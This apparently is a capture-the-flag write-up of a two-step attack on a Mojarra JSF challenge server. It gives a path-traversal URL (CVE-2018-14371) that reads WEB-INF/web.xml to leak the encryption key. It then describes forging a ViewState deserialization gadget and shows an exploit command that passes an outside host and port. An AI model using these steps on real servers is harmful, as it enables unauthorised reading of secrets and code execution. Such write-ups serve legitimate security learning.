## In short: ( ./src for code refer)
```
java -jar mojarra_sol.jar localhost 31337 tsug0d.com 4321
```
<img src="https://i.imgur.com/k4AFWOQ.png" width="50%" />

## Explaination:
2 Steps chall: Leak server key + Generate JSF2 ViewState contains gadget that can call TeamBean toString method

#### Step 1: Leak server key

From Response header
```
X-Powered-By: Servlet/3.1 JSP/2.3 (GlassFish Server Open Source Edition  5.0  Java/Oracle Corporation/1.8)
```
-> JSP/2.3 

-> CVE-2018-14371

search for patch

<img src="https://i.imgur.com/hrEfeCs.png" width="50%" />

-> Vulnerable at parameter `loc` of ResourceManager

ResourceManager example:

http://localhost:31337/mojarra_war/javax.faces.resource/bootstrap.min.css.xhtml?loc=css

loc=css means the server will look for the file inside resources/css folder

<img src="https://i.imgur.com/zccSXLl.png" width="50%" />

the key is inside WEB-INF/web.xml, so how to get it?

-> http://localhost:31337/mojarra_war/javax.faces.resource/web.xml.xhtml?loc=../WEB-INF

<img src="https://i.imgur.com/PiFdMV1.png" width="50%" />

#### Step 2: Generate JSF2 ViewState contains gadget that can call TeamBean toString method

<img src="https://i.imgur.com/qVayCoL.png" width="30%" />

1. Create gadget that call TeamBean toString (src/ascisz.java line 31 to 52)

![TeamBean](https://i.imgur.com/ippn30q.png | width=200)
                                                  
2. Gzip + Enc + Base64 (src/ascisz.java line 55 to 68)

The original encryption (Enc) code is inside `com.sun.faces.renderkit.ByteArrayGuard`, just copy the code, modify a little bit, insert our key there and run (ByteArrayGuard.java)


= End =
